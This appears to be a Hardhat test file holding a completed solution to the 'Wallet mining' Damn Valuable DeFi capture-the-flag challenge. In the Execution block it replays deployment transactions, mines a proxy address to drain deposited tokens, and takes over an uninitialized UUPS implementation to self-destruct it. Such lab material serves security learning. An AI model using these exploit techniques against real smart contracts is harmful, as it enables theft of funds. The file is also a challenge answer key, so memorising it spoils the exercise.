const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");
const { factory, copy, upgrade } = require("./deployment.json");

describe("[Challenge] Wallet mining", function () {
  let deployer, player;
  let token, authorizer, walletDeployer;
  let initialWalletDeployerTokenBalance;

  const DEPOSIT_ADDRESS = "0x9b6fb606a9f5789444c17768c6dfcf2f83563801";
  const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, ward, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy authorizer with the corresponding proxy
    authorizer = await upgrades.deployProxy(
      await ethers.getContractFactory("AuthorizerUpgradeable", deployer),
      [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
      { kind: "uups", initializer: "init" }
    );

    expect(await authorizer.owner()).to.eq(deployer.address);
    expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
    expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

    // Deploy Safe Deployer contract
    walletDeployer = await (
      await ethers.getContractFactory("WalletDeployer", deployer)
    ).deploy(token.address);
    expect(await walletDeployer.chief()).to.eq(deployer.address);
    expect(await walletDeployer.gem()).to.eq(token.address);

    // Set Authorizer in Safe Deployer
    await walletDeployer.rule(authorizer.address);
    expect(await walletDeployer.mom()).to.eq(authorizer.address);

    await expect(
      walletDeployer.can(ward.address, DEPOSIT_ADDRESS)
    ).not.to.be.reverted;
    await expect(
      walletDeployer.can(player.address, DEPOSIT_ADDRESS)
    ).to.be.reverted;

    // Fund Safe Deployer with tokens
    initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
    await token.transfer(
      walletDeployer.address,
      initialWalletDeployerTokenBalance
    );

    // Ensure these accounts start empty
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq("0x");
    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq(
      "0x"
    );
    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq(
      "0x"
    );

    // Deposit large amount of DVT tokens to the deposit address
    await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

    // Ensure initial balances are set correctly
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
    expect(await token.balanceOf(walletDeployer.address)).eq(
      initialWalletDeployerTokenBalance
    );
    expect(await token.balanceOf(player.address)).eq(0);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    // deploy contract fact, copy, deposit_address
    const factoryEOA = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
    const tx = {
      from: player.address,
      to: factoryEOA,
      value: ethers.utils.parseEther("1"),
    };

    await player.sendTransaction(tx);

    console.log(
      "Deploy Contract GnosisSafeProxyFactory, Copy, DEPOSIT_ADDRESS"
    );

    const copyContract = await (
      await ethers.provider.sendTransaction(copy)
    ).wait();

    console.log("Copy Contract Address:", copyContract.contractAddress);

    await (await ethers.provider.sendTransaction(upgrade)).wait();

    const factoryContract = await (
      await ethers.provider.sendTransaction(factory)
    ).wait();

    console.log("Factory Contract Address:", factoryContract.contractAddress);

    const deployedFactory = (
      await ethers.getContractFactory("GnosisSafeProxyFactory")
    ).attach(factoryContract.contractAddress);

    const attackerFactory = await ethers.getContractFactory(
      "WalletMiningAttacker",
      player
    );

    const attacker = await attackerFactory.deploy();

    console.log("Attacker Address:", attacker.address);

    let functionData = attackerFactory.interface.encodeFunctionData("attack", [
      token.address,
      player.address,
    ]);

    console.log("Setting Function Data For Attack");

    for (let i = 0; i < 43; i++) {
      if (i == 42) {
        console.log("Draining funds from Deposit Wallet");

        await deployedFactory.createProxy(attacker.address, functionData);
      }

      await deployedFactory.createProxy(attacker.address, []);
    }

    console.log("Success Created Proxy");

    const implementationAddress =
      await upgrades.erc1967.getImplementationAddress(authorizer.address);

    console.log("Implementation Address:", implementationAddress);

    const authorizerLogic = await ethers.getContractAt(
      "AuthorizerUpgradeable",
      implementationAddress
    );

    await authorizerLogic
      .connect(player)
      .init([player.address], [token.address]);

    const authorizerUpgradeableV2Factory = await ethers.getContractFactory(
      "AuthorizerUpgradeableV2",
      player
    );

    const authorizerUpgradeableV2 =
      await authorizerUpgradeableV2Factory.deploy();

    console.log(
      "Authorizer Upgradeable V2 Address:",
      authorizerUpgradeableV2.address
    );

    let iface = new ethers.utils.Interface(["function destroy()"]);
    let data = iface.encodeFunctionData("destroy", []);

    await authorizerLogic
      .connect(player)
      .upgradeToAndCall(authorizerUpgradeableV2.address, data);

    console.log("Authorizer Upgraded And Called Attack Function");

    for (let i = 0; i < 43; i++) {
      await walletDeployer.connect(player).drop([]);
    }

    console.log("Player Token Balance:", await token.balanceOf(player.address));
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Factory account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.fact())
    ).to.not.eq("0x");

    // Master copy account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.copy())
    ).to.not.eq("0x");

    // Deposit account must have code
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq("0x");

    // The deposit address and the Safe Deployer contract must not hold tokens
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
    expect(await token.balanceOf(walletDeployer.address)).to.eq(0);

    // Player must own all tokens
    expect(await token.balanceOf(player.address)).to.eq(
      initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)
    );
  });
});
